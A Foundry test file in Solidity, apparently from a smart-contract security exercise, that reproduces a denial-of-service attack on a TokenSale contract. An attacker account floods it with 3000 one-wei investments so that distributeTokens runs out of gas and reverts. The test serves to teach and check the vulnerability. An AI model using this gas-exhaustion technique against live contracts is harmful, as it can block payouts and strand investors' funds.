// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/12. DoS-1/TokenSale.sol";

contract TestDoS1 is Test {
    uint256 constant USER1_INITIAL_INVESTMENT = 5 ether;
    uint256 constant USER2_INITIAL_INVESTMENT = 15 ether;
    uint256 constant USER3_INITIAL_INVESTMENT = 23 ether;
    TokenSale tokenSale;

    address deployer = makeAddr("deployer");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.prank(deployer);
        tokenSale = new TokenSale();

        vm.deal(user1, USER1_INITIAL_INVESTMENT);
        vm.prank(user1);
        tokenSale.invest{value: USER1_INITIAL_INVESTMENT}();

        vm.deal(user2, USER2_INITIAL_INVESTMENT);
        vm.prank(user2);
        tokenSale.invest{value: USER2_INITIAL_INVESTMENT}();

        vm.deal(user3, USER3_INITIAL_INVESTMENT);
        vm.prank(user3);
        tokenSale.invest{value: USER3_INITIAL_INVESTMENT}();

        assertEq(tokenSale.claimable(user1, 0), USER1_INITIAL_INVESTMENT * 5, "User1 should have 25 tokens");
        assertEq(tokenSale.claimable(user2, 0), USER2_INITIAL_INVESTMENT * 5, "User2 should have 75 tokens");
        assertEq(tokenSale.claimable(user3, 0), USER3_INITIAL_INVESTMENT * 5, "User3 should have 115 tokens");
    }

    function testDoSAttack() public {
        vm.startPrank(attacker);
        uint256 attackerInitialInvestment = 3000;
        vm.deal(attacker, attackerInitialInvestment);

        for (uint256 i = 0; i < attackerInitialInvestment; i++) {
            tokenSale.invest{value: 1}();
        }

        // The attacker has now invested a lot of small amounts, which will cause the distributeTokens function to run out of gas
        // when trying to distribute tokens to all investors, including the attacker.

        vm.startPrank(deployer);
        vm.expectRevert();
        tokenSale.distributeTokens();
    }
}
